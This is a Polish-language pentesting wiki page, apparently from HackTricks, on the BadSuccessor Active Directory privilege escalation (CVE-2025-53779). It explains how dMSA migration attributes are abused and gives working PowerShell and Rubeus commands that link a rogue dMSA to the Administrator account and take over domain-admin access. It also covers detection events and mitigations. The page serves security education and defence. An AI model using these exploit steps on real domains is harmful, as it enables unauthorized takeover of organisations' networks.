# BadSuccessor: Eskalacja uprawnień poprzez nadużycie migracji Delegated MSA

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Delegated Managed Service Accounts (**dMSA**) to następcy nowej generacji **gMSA**, dostępni w Windows Server 2025. Prawidłowy workflow migracji pozwala administratorom zastąpić *stare* konto (użytkownika, komputera lub service account) kontem dMSA, zachowując w sposób transparentny uprawnienia. Workflow jest udostępniany za pomocą cmdletów PowerShell, takich jak `Start-ADServiceAccountMigration` i `Complete-ADServiceAccountMigration`, oraz opiera się na dwóch atrybutach LDAP **obiektu dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – *link DN* do zastępowanego (starego) konta.
* **`msDS-DelegatedMSAState`**       – stan migracji (`0` = brak, `1` = w toku, `2` = *ukończona*).<sup>[[1]](#references)</sup>

Jeśli attacker może utworzyć dowolne konto dMSA w OU i bezpośrednio zmodyfikować te 2 atrybuty, LSASS i KDC potraktują konto dMSA jako *następcę* wskazanego konta. Gdy attacker następnie uwierzytelni się jako konto dMSA, **odziedziczy wszystkie uprawnienia wskazanego konta** – nawet uprawnienia **Domain Admin**, jeśli powiązane zostanie konto Administrator.<sup>[[1]](#references)</sup>

Technika ta została nazwana **BadSuccessor** przez Unit 42 w 2025 roku. Microsoft później przypisał jej oznaczenie **CVE-2025-53779** i wydał security update w **sierpniu 2025 roku**. Technika pozostaje istotna w niezałatanych środowiskach Windows Server 2025 oraz podczas audytów niebezpiecznej delegacji OU.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Wymagania wstępne ataku

1. Konto, które ma *zezwolenie* na tworzenie obiektów wewnątrz **Organizational Unit (OU)** *i* ma co najmniej jedno z poniższych uprawnień:
* `Create Child` → klasa obiektu **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (generic create)
2. Łączność sieciowa z LDAP i Kerberos (standardowy scenariusz z dołączeniem do domeny / zdalny atak).<sup>[[1]](#references)</sup>

## Enumerowanie podatnych OU

Unit 42 udostępniło skrypt pomocniczy PowerShell, który analizuje security descriptors każdego OU i wyróżnia wymagane ACE:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Pod maską skrypt wykonuje stronicowane wyszukiwanie LDAP dla `(objectClass=organizationalUnit)` i sprawdza każdy `nTSecurityDescriptor` pod kątem

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8 (klasa obiektu *msDS-DelegatedManagedServiceAccount*)

## Kroki eksploatacji

Po zidentyfikowaniu jednostki OU z uprawnieniami zapisu atak wymaga tylko 3 zapisów LDAP:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Po replikacji atakujący może po prostu wykonać **logon** jako `attacker_dMSA$` lub zażądać biletu Kerberos TGT – Windows zbuduje token konta *zastępowanego*.<sup>[[1]](#references)</sup>

### Automatyzacja

Kilka publicznych PoC obejmuje cały workflow, w tym pobieranie hasła i zarządzanie biletami:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Moduł NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Wykrywanie i wyszukiwanie

Włącz **Object Auditing** na jednostkach organizacyjnych (OU) i monitoruj następujące zdarzenia Windows Security:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – utworzenie obiektu **dMSA**
* **5136** – modyfikacja **`msDS-ManagedAccountPrecededByLink`**
* **4662** – zmiany określonych atrybutów
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – wystawienie TGT dla dMSA

Korelacja zdarzeń `4662` (modyfikacja atrybutu), `4741` (utworzenie konta komputera/usługi) i `4624` (późniejsze logowanie) szybko wskazuje aktywność BadSuccessor. Rozwiązania XDR, takie jak **XSIAM**, zawierają gotowe zapytania (zobacz referencje).<sup>[[2]](#references)</sup>

## Łagodzenie

* Zastosuj aktualizację bezpieczeństwa firmy Microsoft dla **CVE-2025-53779** i zweryfikuj poziom poprawek każdego kontrolera domeny Windows Server 2025.<sup>[[6]](#references)</sup>
* Stosuj zasadę **najmniejszych uprawnień** – deleguj zarządzanie *Service Account* wyłącznie zaufanym rolom.
* Usuń `Create Child` / `msDS-DelegatedManagedServiceAccount` z jednostek organizacyjnych, które nie wymagają tego wprost.
* Monitoruj wymienione powyżej identyfikatory zdarzeń i generuj alerty, gdy tożsamości *spoza Tier-0* tworzą lub edytują dMSA.

## Zobacz także


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Wykorzystanie dMSA do eskalacji uprawnień w Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Gdy dobre konta stają się złe: wykorzystywanie Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – kolekcja narzędzi Pentest-Tools](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Moduł NetExec BadSuccessor](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
